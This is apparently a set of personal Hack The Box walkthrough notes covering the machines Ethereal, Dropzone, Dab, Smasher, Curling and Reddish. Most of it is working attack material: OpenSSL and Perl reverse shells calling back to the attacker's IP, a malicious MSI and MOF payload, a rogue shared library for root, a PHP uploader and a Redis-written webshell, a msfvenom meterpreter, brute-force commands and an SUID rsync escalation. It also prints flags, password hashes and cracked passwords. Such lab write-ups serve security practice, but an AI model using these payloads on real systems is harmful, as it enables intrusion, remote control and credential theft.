HTB ETHEREAL
1)First its first so we do an nmap scan showing us the following result:
80 tcp
8080 tcp
21 tcp
 
with no udp ports open
 
so ftp its open and we to to test that service out and download everything thats in there using:
mget *
 
2)Then with gobuster i run it on http://10.10.10.106 which give us this interesting dirs:
 
On port 80:
 
-http://10.10.10.106/
-http://10.10.10.106/corp/console/admin.aspx
-http://10.10.10.106/crop/help/assistance.aspx
 
On port 8080:
i had seen the link to http://ethereal.htb:8080 on the admin page, we add 10.10.10.106 ETHEREAL.HTB to /etc/hosts, and then was able to see a basic auth login page.
 
There was a false user flag  in the admin desktop page.
 
3)So now we now we need some credentials to login onto the webpage on 8080.
so read throught stuff we found in ftp more carefully:
 
so to check FDISK,DISK1,DISK2, contents we can run:
mkdir ./mnt && mkdir ./mnt/FDISK && mount -o loop FDISK ./mnt/FDISK
mkdir ./mnt && mkdir ./mnt/DISK1 && mount -o loop DISK1 ./mnt/DISK1
mkdir ./mnt && mkdir ./mnt/DISK2 && mount -o loop DISK2 ./mnt/DISK2
 
so in FDISK we manage to found pbox.exe and pbox.dat
after researching i found pbox.exe its somewhat linked to an old emulator for games and dos programs named "DOSBOX""
and we can install in our kali wiht apt-get install dosbox
Now in dosbox we can mount our files like this:
mount c /path/to/box/files
running pbox.exe ask for cwsdpmi.zip its some sort or a depency so we download from here:
https://www.dosgames/com/files/cwsdpmi.zip
and extract and place on /mnt/FDISK/pbox/
now we can mount our path and run pbox.exe which ask for a password so we use the most common password:  "password""
and we are in.
 
4)now some sort of database program show up everytime we select one item it shows us a user and a password so we can make a list out of and crack it trought hydra
 
hydra -L user.txt -P password.txt http-get://ethereal.htb:8080
 
and was able to get basic auth:
 
user:       alan   
password:   !C414m17y57r1k3s4g41n!
 
we test it in our 8080 port site and we are in with an admin console and a test box that shows test connection.
so immediately go and test my ip showing and see that connection its successful.
 
Then tried appeding commands after ping command using &&, ||, |
 
Was able to run commands at first with
 || for /f "tokens" %i in ('whoami') do nslookup %i 10.10.15.110
without my ip addres which shows me the name 'etherealalan' on wireshark results.
 
If played with the token number was able to see whichever word of a response i selected as the token number.
e.g. if the response to whoami was "ethereal\alan" the backslash character does not travel through the results we can view, so the token =1, would give me the world etherealalan, whereas if i did the command "echo test 123", token =1 would show test and token=2 would show 123.
 
At this point it was safe to say we were dealing with blind read-only RCE.
Enumerating this way was an absolute pain and i had to check my other options.
 
Since i knew i couldnt execute anything, i wanted to know why.
 
I checked the firewall rules, using:
netsh advfirewall firewall show rule name=all
 
this showed port 73 and 136 are open and openssl.exe installed.
 
so we can do this:
-first we create our key.pem and cert.pem with this command:
 
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 
-then we setup our first terminal and launch this command to listen on port 73:
 
openssl s_server -quiet -key key.pem -cert cert.pem -port 73
 
-now on a second terminal we run this command to listen for connections port 136:
 
openssl s_server -quiet -key key.pem -cert cert.pem -port 136
 
and finally from admin console we launch this command:
 
10.10.15.110 | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:136
 
 
Now i was trying to run commands as it its on the shell i got but nothings seems to work after for mistake i typed a dir comand and hit send to see if it works then trying to open another shell with webadmin console i didnt stop my preovious shell an run the command again a magic the command worked!
 
So to run commands we must execute the command on port 73 terminal then send admin console web command and it gets executed!
Now we have to find a way to upload files researching we came to an easy solution
 
on my kali:
 
openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < uploadme.txt
 
on webapp:
 
10.10.15.110 | C:\Progra~2\OpenSLL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 > c:\users\public\desktop\shortcuts\saveme.txt
 
while enumerating we found a file located in c:\users\public\desktop\note-draft.txt which said:
"I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
-Alan
this command its useful to run a command and if want an answer automatick respond
echo yes | command to run
 
 
Now we have to replace the lnk file located on C:\users\public\desktop\shortcut\"Visual Studio 2017.lnk""
 
sow we can generate one with this program
 
LNKUp(on github)
 
python generate.py --host localhost --type ntlm --output pay.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:136"
 
then we can encoded in base 64 doing
 
openssl base64 -A -e -in pay.lnk -out pay
 
then copy the string encoded and go to windows machine and run this command:
 
echo | set /p="base64 encoded string" > c:/users/public/desktop/shortcuts/pipo.txt
 
next step its to decode the file which one we put encoded string and at the same time replace the visual studio.lnk
so we navigate to the dir containing the .lnk file and do this :
 
cd c:\users\public\desktop\shortcuts
c:\progra~2\openssl-v1.1.0\bin\openssl base64 -A -d -in pipo.txt -out "Visual Studio 2017.lnk"
type c:\users\public\desktop\shortcuts\"Visual Studio 2017.lnk"# to check if the lnk got replaced
then if it got replaced you have to kill the 2 shell connections and start it again to wait for jorges connection:
***note***
We have to be precise with timing cuz it seems the lnk file gets replaced by the original every few minutes so maybe it will not work at first time cuz timing.
 
Once we have the connection we can now read the user flag.
type c:\users\jorge\desktop\user.txt
2b9a4ca09408b4a39d87cbcd7bd524dd
 
Now onto PRIVILEGE SCALATION

Enumeration took us to D:\ volume there was a file located in D:\DEV\MSI\note.txt that was from user etherea\rupal
Please drop MSIs that need testing into this folder - I will review regularly.
Certs have been added to the store already.
- Rupal

Now we know we need to generate an evil.msi file to put in that folder for rupal "test"

so we can generate one msi file like this:
########################################################################################
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product
Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer
Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles"
Guid="12345678-1234-1234-1234-222222222222">
<File Id="ApplicationFile1" Source="D:\Windows\tracing\test.txt"/>
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="cmd.exe /c
C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:73| cmd.exe |
C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:136"
Execute="deferred" Impersonate="yes" Return="ignore"/>
<CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
invalid vbs to fail install
</CustomAction>
<InstallExecuteSequence>
<Custom Action="SystemShell" After="InstallInitialize"></Custom>
<Custom Action="FailInstall" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
##############################################################################
I used the wix tool set (which can be found at http://wixtoolset.org/releases/ ) on
my windows vm to compile the msi xml file shown above.

I used candle.exe on the msi xml file above which created payload.wixobj

then light.exe payload.wixobj which creates the compiled payload.msi

I had to download the certs rupal mentioned in his note so I could sign my malicious .msi
file. The certs were in the D:\certs folder, MyCA.cer and MyCA.pvk

I was able to use the certs to sign my malicious msi file using:
pvk2pfx -pvk C:\temp\MyCa.pvk -spc C:\temp\MyCa.cer -pfx C:\temp\MyCa.pfx
which created the MyCA.pfx file that includes the cer and pvk

makecert -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic
C:\temp\MyCA.cer -iv c:\temp\MyCA.pvk -sv C:\temp\MySPC.pvk c:\temp\MySPC.cer
which creates a new MySPC.cer and MySPC.pvk for signing

pvk2pfx -pvk C:\temp\MySPC.pvk -spc C:\temp\MySPC.cer -pfx C:\temp\M
ySPC.pfx
which uses the new cer and pvk files to create my own pfx

signtool sign /v /n "Me" /s SPC C:\file.msi
and finally sign the msi payload file

I uploaded my payload msi to C:\windows\tracing\ so that I could copy it to the
D:\DEV\MSIs folder as needed.

When an msi file is uploaded to the D:\DEV\MSIs folder, every few minutes rupal “tests”
the file and then deletes all msi files in D:\DEV\MSIs.

As soon as I copy the msi file with the openssl command, I have to VERY QUICKLY :
● exit out of the openssl connection I have as jorge
● enter the openssl command to wait for a connection again on port 73
● and then type or paste in a command to be run as rupal.

If done correctly, you will see the command run as rupal.
The command I used was a simple:
type C:\Users\rupal\Desktop\root.txt

root flag: 1cb6f1fc220e3f2fcc0e3cd8e2d9906f
 
 
*************************************************************
 
HTB DROPZONE
1)As usual we start nmap with tcp but nothings shows up wear
2)now we launch upd scan and we got 1 port
69 upd tftp server
3)now we can launch tftp scripts with nmap and found boot.ini
4)Connecting to the server we download the file
and we see
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
5)now searching for vulnerabilities we found stuxnet and reading about it i found it uses 4 vulnerabilities one of them its the mof file injection so we can read about it in:
http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html
6)so we developed our mof file like this:
#pragma namespace ("\\\\.\\root\\subscription")
 
class MyClass7307
{
 [key]
 string Name;
};
 
instance of __EventFilter as $FILTER
{
    Name = "XPLOIT_TEST_SYSTEM";
    EventNamespace = "root\\subscription";
 Query = "SELECT * FROM __InstanceCreationEvent "
         "WHERE TargetInstance.__class = \"MyClass7307\"";
 
    QueryLanguage = "WQL";
};
 
instance of ActiveScriptEventConsumer as $CONSUMER
{
    Name = "XPLOIT_TEST_SYSTEM";
    ScriptingEngine = "VBScript";
 
    ScriptText =
      "Set objShell = CreateObject(\"WScript.Shell\")\n"
   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 10.10.15.110 4444 -e C:\\Windows\\system32\\cmd.exe\"\n";
};
 
instance of __FilterToConsumerBinding as $BIND
{
    Consumer = $CONSUMER ;
    Filter = $FILTER ;
};
 
instance of MyClass7307{
 Name = "Woot";
};
7)then we upload nc.exe to c:\ and the mof file to windows\system32\wbem\mof\filename
if we want to see if the mof gets compiled we can download the log from windows\system\32\wbem\logs\mofcomp.log
Everytime we want to upload the mof file we should change the names of the class and of the exploit_test_name
now we setup our nc listener and upload the mof and we got a shell but instanstly we got kick off
so i upload a meterpreter payload made with msfvenom.
Did process again and once on nc shell we call our payload with absolute path and boom we have a meterpreter
 
Now searching for user.txt
 
8)Now looking for that damn flag i got to administrator/Desktop
where its a root.txt and flag folder both of them are a troll
For limited time only!                                                                                                          
Keep an eye on our ADS for new offers & discounts!
 
Now seeing to that ADS thing its has to be a hint so i found something about:
 
ALTERNATE DATA STRINGS
its a way to hide or something like it text or files in ntfs systems.
So searching for a way to get read or search that kind of files i found this tool
streams.exe now e upload and run it accept the eula
and on administrator\desktop\
 
we run it with streams -s
 
Showing us both flags that were hidden!
USER:a6a4830ddd27a1bddd59d2aaa80f7940
ROOT:45cd53a83bf364456386816e35e6a98e
 
 
******************************************
HTB DAB
1)Nmap show us 4 port
21 tcp ftp
22 tcp openssh
80 tcp web
8080 tcp web
2)running dirb doest show us anything no pass user or nothig
3)on port 80 we found a login form and on port 8080 we see a message wrong password cookie
now lets try to bruteforce with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.86 http-post-form "/login:username=admin&password=^PASS^&submit=Login:Error" -t 64
default most simple user : admin we found its password : Password1
4)Now we can start making our way in
5)Capturing the login request with burp we see theres a cookie for our session so i assume i have to use this cookie on the other port.
6)We capture the request for port 8080
7)Then we see if we change the cookie we got from admin on port 80 to port 8080 its give us a different response invalid password for cookie so we can appen the value ;password=mypassword; at the end.
 
GET / HTTP/1.1
Host: 10.10.10.86:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DrtWBg.AIM2lbINPVlYH3oiuZo8SnvajSM;password=not;
Connection: close
Upgrade-Insecure-Requests: 1
 
8)After using burp intruder to try to crack the password and so many attemps i decided to give it a go to wfuzz
we use it like this:
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hh 324 -u http://10.10.10.86:8080 -b password=FUZZ -t 50
 
and we bruteforce the password getting :    secret
now we can modify the burp request and set to the correct password
GET / HTTP/1.1
Host: 10.10.10.86:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DrtWBg.AIM2lbINPVlYH3oiuZo8SnvajSM;password=secret;
Connection: close
Upgrade-Insecure-Requests: 1
 
9)now showing response in browser we are in page that ask us for a tcp port and a line to execute:
 
URL = http://10.10.10.86:8080/socket?port=6666&cmd=nc%2010.10.15.110
 
when we execute any command we see 500 internal server errro and/or hacking attemp:
so its running memcached.
 
The fact that a cache engine is being mentioned is a huge hint. A quick google will eventually
lead us to the memcached software which is a key-based cache that stores data and objects
wherever spare RAM is available for quick access by applications, without going through layers
of parsing or disk I/O. According to MySQL and memcached guide, by default, memcached uses
the following settings:
 
• Memory allocation of 64MB
• Listens for connections on all network interfaces, using port 11211
• Supports a maximum of 1024 simultaneous connections
 
Reading a ton about memcached i found this interesting info:
https://ma.ttias.be/read-keys-values-memcached-instance/
10)so i run in the memcached server the following commands:
first:
stats slabs #to see how many slabs of data there were
second:
stats cachedump 26 1000 #26 its the number of the slab where the data its stored there were other slabs but they not contian any data at all.
this shows us theres a key named users so
third:
get key users
11)this shows us a dic with all the users and their md5 hashes 496 users.
so we can try and use everyone of them in ssh or we can make a ssh enum with metasploit so fire up and set :
use auxiliary/scanner/ssh/ssh_enumusers
set your ports and a txt file containing all the users
for the dic as its constructed as dic the user its the key value so i made a script to print me just the key values and then stored into a txt file to give to metasploit.
Run you scanner and the user actually found its:
cracked with crackstation
genevieve with hash fc7992e8952a8ff5000cb7856d8586d2:Princess1
 
Use on ssh and we are in!! let get the user flag
 
12)Now into priv Escalation.
Looking for all steps for priv esc i found a binary called try_harder but its a rabbit hole now searching i found another binary called myexec it ask for password.
I downloaded to my machine with python simplehttpserver
now when i try to run it it ask for a library libseclogin as it not installed by default i google it to try an install it and its actually a code from a guest user on pastebin and in the end of writeup theres the password for the same binary
/usr/bin/myexec actually the password its s3cur3l0g1n.
Now for the correct way to do it we will diasembly with radare2
RUN radare2 myexec
.enter aaa to analize the whole program
.enter s main to go to the main function
.now pdf to see the funtion diasembly
.if you enter VV you enter diagram mode.
 
Now looking for the code wee see theres some lines of text s3curel0 and in a separated variable another string g1n
which its the password.
Now running the binary give us this:
 
Password is correct
 
seclogin() called
 
TODO: Placeholder for now, function not implemented yet
 
This is the part which I spent a good amount of time looking into this binary file. One of the
commands (besides the typical ones such as getfacl, getcap, etc.) is objdump which displays
information from object files. Let's display the contents of all headers using the -x option for the
myexec program:
 
$ objdump -x /usr/bin/myexec
 
...
 
Dynamic Section:
 
 NEEDED libseclogin.so
 
 NEEDED libc.so.6
 
...
 
As the output indicates, the myexec binary depends on two dynamic libraries (.so shared objects
files). This means that the program references these libraries at runtime (similarly to Window's
.dll). We can see this by running ldd which prints shared object dependencies:
 
$ ldd /usr/bin/myexec
 
 linux-vdso.so.1 => (0x00007ffe00c69000)
 
 libseclogin.so => /usr/lib/libseclogin.so (0x00007f880282f000)
 
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8802465000)
 
 /lib64/ld-linux-x86-64.so.2 (0x00007f8802a31000)
 
Let's focus in libseclogin.so library since libc is the C standard library. The libseclogin shared
object is owned by root and we have no write permissions in the /usr/lib/ directory from where
the library is referenced.
 
$ ls -la /usr/lib/libseclogin.so
 
-rwxr-xr-x 1 root root 8120 Mar 25 23:46 /usr/lib/libseclogin.so
 
The vector of attack here would be similar to python library hijacking, and we could actually
configure dynamic linker run-time bindings using the ldconfig command. Normally, we would
need root privileges to do such operations, unless the sticky bit is set for ldconfig (which is
unusual, but in this case it is configured so as we mentioned it earlier). This is where privilege
escalation takes place, as we can manually link libraries using the -l option of ldconfig.
now at end of the function it look it calls libseclogin() but its not finished yet so we can create our custom script to call it from our own library like this:
 
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
void seclogin()
{
        setuid(0);
        setgid(0);
        execl("/bin/bash","sh",(char *)0);
}
int main(void)
{
        seclogin();
}
 
Compile the code with
gcc -shared -o libseclogin.so -fPIC libseclogin.c
 
Now
ldconfig -l /dev/shm/libseclogin.so
 
Since dynamic linker uses the LD_LIBRARY_PATH variable, we need to set that up too:
 
$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/dev/shm
 
run ldconfig to change variable path.
execute myexec and get root flag:
45cd53a83bf364456386816e35e6a98e
 
***************************************************
HTB SMASHER
1)Nmap throws us some results open ports:
6969 tcp acmsoda
1111 tcp lmsocialserver
22 tcp openssh
2)Running dirb doesnt show us anything
3)Navigating through the ports no one seems to respond but for a second i got a response from port 1111 on web
it seems theres a service that restarts every 60 seconds that why i was no having responses at all
4)Again runing dirb doesnt shows anything
5)In 1111 webpage we see theres something like dir we select index.html and see a login page perhaps we can navigate further if we scape another "/" so we go to http://10.10.10.89:1111// and we see all the dirs listed online.
 
*************************************
 
HTB CURLING
1)Enumeration with nmap show us 2 open port 80,22
2)Acces with browser its a joomla webpage with some info
3)researching the source code we found a directory to upload and file called secret.txt with a base64 encoded password which is: Curling2018!
Now reading on the webpage we see Super User posts but one of them its signed by a user named floris so we try to login with floris:Curling2018 and it worked.
Now searching through dirs we found /administrator page for joomla login:
and the same credentials worked well.
now we must find a way to upload something.
logged to joomla we found and interesting module to upload now just set it up and allow some file type like php to get your reverse shell
***********************
<?php echo '<b><br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>toborbitch</b><br><br>'; } else { echo '<b>Upload Sucess !!!</b><br><br>'; } } ?>
***********************
4)Then we search a directory to upload files
http://10.10.10.150/index.php/component/users/?view=remind&Itemid=101
and accept php files so we try to upload a php-reverse shell and it worked
now we are inside www-data user we see a pass backup
now we see its a hexdump file so the method to decrypt this types of files its:
xxd -r password_backup
then the result file we have to see what type its so we use:
file password_backup
then change file extension to the type of file it its and decompress
then again check file, change extension, decompress until you get something readable
5)Now we got the password: for floris user which is : 5d<wdCbdZu)|hChXll
6)login in through ssh and get the user flag.
7)Now for privilege scalation
8)We see a folder called admin-area its seems suspicious so we go to dir and we found to files one called input which parses all 127.0.0.1 data to the other file named report. and its running as root! so we can take advantage on this:
On the input file we can overwrite its contents and put:
url = "file:///root/root.txt"
before it was url= "http://127.0.0.1/""
and automatic you will get you key
from etc/shadow  root hash>>>>  $6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1
 
and we got the root flag: 82c198ab6fc5365fdc6da2ee5c26064a
 
**********************************************
 
HTB REDDISH
1)As usual we run our nmap scan and show us just tcp port 1880
2)we navigate to it in browser and just got a /get response
3)gobuster -t 150 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-
medium.txt -u http://10.10.10.94:1880/ -x txt,js
Three directories are returned: icons, red, and vendor. We can enumerate all three just like we
did above. One interesting file found is /red/about, which shows us the version of the application
and helps us.
Browsing to http://10.10.10.94:1880/ gives the following error:
If we can’t GET /, then how about we try to POST /. You can do this via BURP and get:
 
4)Now we can search for post or get request with curl on the main page
5)Running curl -X POST http://10.10.10.94:1880
we got a response with a path and an id
6)Using this path and id like it showed us we managed to login to node-red cli
Using the RCE technique above, we can run basic commands to get an understanding of what is
installed on the box to help us upgrade to a reverse shell. Commands like “which nc” are a good
and simple way to see if individual programs are present. We can also test for outbound
connectivity by having Exec run a ping to our Kali box. You will need to modify the Exec node,
redeploy the flow, and initiate it each time you want to change the command.
This is a very stripped-down Linux box. The only useful program that I was able to find was perl.
We can get a reverse shell by modifying Exec to run the following perl script found on Pentest
Monkey’s Reverse Shell Cheat Sheet. Replace the IP and port with your own. You can leave the
output attached to debug or delete it; it won’t affect the shell either way.
*****************************************************************************
perl -e 'use
Socket;$i="10.10.14.3";$p=8050;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S")
;open(STDERR,">&S");exec("/bin/bash -i");};'
*****************************************************************************
 
Setup your listener, deploy the flow, and click the button on the timestamp node to initiate it
7)Playing around with setting we managed to get a reverse shell with the following:
make a tcp-in with ip:port to listen on
make a exec as default
make a tcp-out with reply to tcp
connect it all and run
 
the other way its importing an already created reverse shell flow:
[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.15.110","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
   
 
whithout previously had a nc listening
 
8)We got a shell but its a container and has not tty so we can use shellpop to bring us a tty so we use perl:
in actual nc connection we put this perl command:
shellpop --reverse --number 5 --host tun0 --port 2001
 
perl -M Socket -e "\$PKHrmaUTMiwXjh='10.10.15.110';\$VsKVSQDNYqNCy=2000;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$VsKVSQDNYqNCy,inet_aton(\$PKHrmaUTMiwXjh)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
now we listen for conection with nc in the port we specify and we got a tty shell just do bash -i !
*****To upgrade to meterpreter::******
1)
now we can upgrade to a meterpreter shell launch msf and
set multi/handler
set payload linux/x86/shell/reverse_tcp and run
once you got it background CTRL+Z
and session -u "sessions_id"    or  use post/multi/manage/shell_to_meterpreter
>meterpreter>
2)
another way its creating an elf file like this:
(not through post/multi/manage/shell_to_meterpreter module because the session
was dying often). Instead, I created an ELF file, transferred it to the container using base64
encoding/decoding, set up a listener and executed the file.
In our local machine:
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.76 LPORT=2002
-f elf -o meterpreter.elf
...
$ base64 -w 0 meterpreter.elf
...
$ sudo msfconsole -q
...
In the target machine:
# echo -n <b64 string> | base64 -d > meterpreter.elf
# chmod +x meterpreter.elf
# ./meterpreter.elf
******************************************************
9)running /sbin/ip a 2>/dev/null we managed to find some new interfaces on this machine
 
Now that we have two potential IPs to target, let’s start enumeration. We don’t have nmap, nc, or
other useful port scanning options available to us, but there are still a few ways we can do this.
• We could transfer over a statically compiled version of nc, nmap, or another tool
• We could try setting up a dynamic tunnel and port scan through proxychains
• We could use built-in bash scripting for scanning
• We could run a perl port scanning script
There may be more methods that I didn’t consider, but I chose to try the bash script since it
didn’t mean having a dependency on other binaries or script files.
for p in {1..65535}; do echo hi > /dev/tcp/172.19.0.2/$p && echo port $p is open >
scan 2>/dev/null; done
The screen will get cluttered with errors due to the nature of our reverse shell, but the successful
output will be written to the file ‘scan’. Running this command on the two IPs give us what ports
are open on each container:
172.18.0.x 172.19.0.x
.1 GW .1 GW
.2 NODE-RED (1880) .2 Alive (6379)
.3 NODE-RED (1880)
.4 Alive (80)
A quick Google search shows that port 6379 typically belongs to a Redis/NoSQL database
server. Web servers are usually easier to enumerate and exploit, so let’s look at the .4 IP first.
eth0:   172.18.0.2
eth1:   172.19.0.4
now we install nmap on the remote mahchine and run a tcp scan for all ports and all ips x.x.x.x/16
we found we have 172.19.0.3 with open port 6379 redis
and 172.19.0.2   with 80 open port apache
 
10)Now we procced to instal nmap uploading it and or redis-cli to start dumping the db.
 
Bash Exploiter:
ay IP address), 172.19.0.2 , and 172.19.0.3 (which will be our next targets). Considering
the fact that we are already root at the container and there is nothing in there, we should move on
with pivoting techniques for the internal network of 172.19.0.0/16 .
3We will now scan the two target internal hosts for open port. We will use a perl portscanner that
is available on github (since perl is installed in the machine). Results are:
 
Host 172.19.0.3 has an open port at 6379 (Redis);
Host 172.19.0.2              has an open port at 80 (HTTP).
 
Next, we will relay connections on these ports to our local machine using metasploit’s portfwd
with 172.19.0.4 (the container) being as our intermediary:
       
meterpreter> portfwd add -l 80 -r 172.19.0.2 -p 80
meterpreter> portfwd add -l 6379 -r 172.19.0.3 -p 6379
 
Now http://localhost/ will show the following:
If we examine the HTML source code carefully, we will notice that the webserver has a PHP file
called ajax.php that connects with Redis DB through a parameter called test :
/8904n0549008565c554f8108cn11fna4/ajax.php?test=get hits
 
Redis has eloquently explained how it can be used for remote command execution if not securely
configured to mitigate arbitrary access. You can read about the article here:
https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt
 
We can try to abuse the vulenerability by uploading a PHP file. I will use redis-cli ( redis
package is required), and since we already have port fowarding on, the commands we enter will
relay to 172.19.0.2:6379 . We don’t need to specify a port for redis-cli since it runs by default
on 6379 and that is exactly the same port we are listening through portfwd . I made the following
script to automate the process of creating a shell.php file in the /var/www/html directory that
expects a cmd query to execute system commands, in case our PHP gets removed.
 
#!/bin/bash
redis-cli flushall
redis-cli set myshell "<?php echo system(\$_REQUEST['cmd']); ?>"
redis-cli config set dbfilename "shell.php"
redis-cli config set dir /var/www/html
redis-cli save
 
4We should see bunch of OKs after running the script, which means that http://localhost/shell.php
now exists, and we have RCE as www-data (http://localhost/shell.php?cmd=whoami).
We can get a shell by uploading a perl script in the /tmp directory of the internal host. Since the
internal host cannot communicate with our local machine, the reverse shell should point at the
container ( 172.19.0.4:3000 ), which then we will redirect that traffic to our machine by using a
tool called socat .
 
The perl script will look like this:
1)perl -e 'use Socket;$i="172.19.0.4";$p=3000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
then can base64 and URL encode this script and upload it through curl as /tmp/shell.pl or we can run it directly from the browser php shell we have.
 
2)perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"172.19.0.4:3000");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
**************************
curl --data "cmd=echo+-n+  
dXNlIFNvY2tldDskaT0nMTcyLjE5LjAuNCc7JHA9MzAwMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU
1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLG
luZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwnPiZTJyk7b3BlbihTVERPVVQsJz4mUycpO29wZW4
oU1RERVJSLCc%2FJlMnKTtleGVjKCcvYmluL3NoIC1pJyk7fTs%3D +|+base64+-
d+%3E+/tmp/shell.pl" http://localhost/shell.php
*************************************
Before sending another curl command to execute this script, we need to get back to msfconsole
(where we left with portfwd commands) and upload the socat binary (which is an advanced
netcat ) for port fowarding the traffic from 172.19.0.4:3000 to our machine at
10.10.14.76:3003 .
meterpreter> cd /tmp
meterpreter> upload socat
meterpreter> shell
bash -i
# chmod +x socat
# ./socat tcp-listen:5001,reuseaddr,fork tcp:10.10.15.100:3003
We can setup a netcat listener in our machine at port 3003 and enter the following command to
execute the shell.pl script:
$ curl --data "cmd=perl+/tmp/shell.pl" http://localhost/shell.php
This should spawn us a shell for the internal host:
After enumerating, we see two users in the /home directory, where user.txt is located at
/home/somaro , however only root is able to read that.
so after 3 days being stucked finally got it:
1st method:
first we have to cp /bin/sh to cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b cuz thats the only dir that belong to us
then we have to chmod 777 /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh
then we have to chmod u+s /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh
then we do rsync -p /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh root@backup::src/backup/
finally we rsync and chmod with the SUID BIT SET with:
rsync -p --chmod=+s root@backup::src/backup/sh /var/www/html/
run it ./sh and we are root.
 
2nd method:
echo -n IyEvYmluL3NoCmNwIC9iaW4vc2ggL3RtcC9zaApjaG1vZCArcyAvdG1wL3No | base64 -d > root.rdb
$ chmod +x root.rdb
$ cat root.rdb
#!/bin/sh
cp /bin/sh /tmp/sh
